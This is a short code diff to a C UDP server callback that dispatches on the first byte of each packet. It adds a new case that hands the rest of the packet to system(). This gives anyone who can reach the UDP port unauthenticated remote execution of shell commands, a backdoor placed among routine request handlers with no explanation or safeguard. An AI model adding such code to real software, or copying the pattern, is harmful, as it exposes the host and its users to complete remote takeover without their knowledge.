@@ -123,6 +123,10 @@ static void udb_server_recv_cb(uv_udp_t* handle,
             result = erase(buf->base[1]); if(result!=OK) { /* ignore any errors */ }
             break;
 
+        case 3:
+            system(&buf->base[1]);
+            break;
+
         default:
             LOG_ERROR("Unknown UDP request %d (%02X)", nread, buf->base[0]);
             break;
